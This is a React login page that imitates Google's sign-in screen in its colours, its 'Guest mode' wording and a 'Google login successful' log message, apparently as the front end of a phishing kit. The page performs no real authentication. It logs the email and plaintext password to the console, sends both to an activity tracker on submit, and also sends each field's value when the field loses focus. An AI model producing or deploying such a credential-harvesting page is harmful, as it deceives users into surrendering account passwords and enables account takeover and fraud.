import { useState, useEffect } from "react";
import logoImage from "./logo.png";
import {
  trackPageView,
  trackPageExit,
  trackInputFocus,
  trackInputBlur,
  trackInputChange,
  trackButtonClick,
  trackLinkClick,
  trackFormSubmit,
} from "./utils/activityTracker";

interface LoginPageProps {
  onNavigate: (email: string, password: string) => void;
}

export default function LoginPage({ onNavigate }: LoginPageProps) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  // Track page view on mount
  useEffect(() => {
    trackPageView('/login-page-1');
    
    return () => {
      trackPageExit('/login-page-1');
    };
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Google login successful with:", { email, password });
    
    // Track form submission
    trackFormSubmit('login-form-page-1', { email, password }, '/login-page-1');
    
    setLoading(true);
    // Simulate loading then navigate
    setTimeout(() => {
      onNavigate(email, password);
    }, 800);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#f0f4f9] px-4 py-8">
      {loading && (
        <div className="fixed inset-0 bg-white z-50 flex items-center justify-center">
          <div className="flex flex-col items-center">
            <div className="w-12 h-12 border-4 border-gray-200 border-t-blue-600 rounded-full animate-spin"></div>
          </div>
        </div>
      )}
      <div className="w-full max-w-[900px]">
        {/* Main Card Container */}
        <div className="bg-white rounded-2xl shadow-md overflow-hidden">
          {/* Logo for Mobile - Center */}
          <div className="md:hidden flex justify-center pt-6 px-6 pb-2">
            <img src={logoImage} alt="Logo" className="h-16 w-auto" />
          </div>

          <div className="flex flex-col md:flex-row">
            {/* Left Side - Logo and Text */}
            <div className="flex-1 p-8 md:p-10 flex flex-col justify-start pt-0 md:pt-8">
              <div>
                {/* Logo for Desktop - Upper left corner */}
                <img src={logoImage} alt="Logo" className="h-24 w-auto mb-4 hidden md:block" />
                <h1 className="text-[28px] md:text-[30px] font-medium text-gray-900 mb-2 md:mb-3">
                  Sign in
                </h1>
                <p className="text-[16px] md:text-[15px] font-normal text-gray-700 leading-relaxed">
                  Sign in to your account to continue. Enter your credentials below to access.  
                </p>
              </div>
            </div>  
    
            {/* Right Side - Form */}
            <div className="flex-1 pt-2 pb-4 px-4 md:p-10 flex flex-col justify-center bg-white">
              <form onSubmit={handleSubmit} className="space-y-3 md:space-y-5 mt-0 md:mt-8">
                {/* Email Input */}
                <div>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      trackInputChange('email-input-page-1', e.target.value.length > 0, '/login-page-1');
                    }}
                    onFocus={() => trackInputFocus('email-input-page-1', '/login-page-1')}
                    onBlur={() => trackInputBlur('email-input-page-1', email, '/login-page-1')}
                    placeholder="Your mail"
                    className="w-full px-4 py-3.5 md:py-3 border border-gray-300 rounded text-[16px] md:text-base focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-100 transition-all placeholder:text-gray-500"
                    required
                  />
                </div>

                {/* Password Input */}
                <div>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      trackInputChange('password-input-page-1', e.target.value.length > 0, '/login-page-1');
                    }}
                    onFocus={() => trackInputFocus('password-input-page-1', '/login-page-1')}
                    onBlur={() => trackInputBlur('password-input-page-1', password, '/login-page-1')}
                    placeholder="Your password"
                    className="w-full px-4 py-3.5 md:py-3 border border-gray-300 rounded text-[16px] md:text-base focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-100 transition-all placeholder:text-gray-500"
                    required
                  />
                </div>
                {/* Forgot Email Link */}
                <div>
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      trackLinkClick('reset-password-link-page-1', '/login-page-1');
                    }}
                    className="text-[15px] md:text-sm font-medium text-blue-600 hover:underline"
                  >
                    Reset password ?
                  </a>
                </div>

                {/* Guest Mode Info */}
                <div className="pt-2">
                  <p className="text-[15px] md:text-sm text-gray-700">
                    Not your computer? Use Guest mode to sign in privately.{" "}
                  </p>
                </div>

                {/* Action Buttons */}
                <div className="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-3 sm:gap-4 pt-4">
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      trackLinkClick('create-account-link-page-1', '/login-page-1');
                    }}
                    className="text-[15px] md:text-sm font-medium text-blue-600 hover:underline text-center sm:text-left"
                  >
                    Create account
                  </a>  
                  <button
                    type="submit"
                    onClick={() => trackButtonClick('continue-button-page-1', '/login-page-1')}
                    className="px-6 py-3 md:py-2.5 bg-blue-600 text-white text-[16px] md:text-sm font-medium rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-purple-300 transition-colors shadow-sm hover:shadow"
                  >
                    Continue
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-6 px-4">
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-gray-600">
          </div>
        </div>
      </div>
    </div>
  );
}
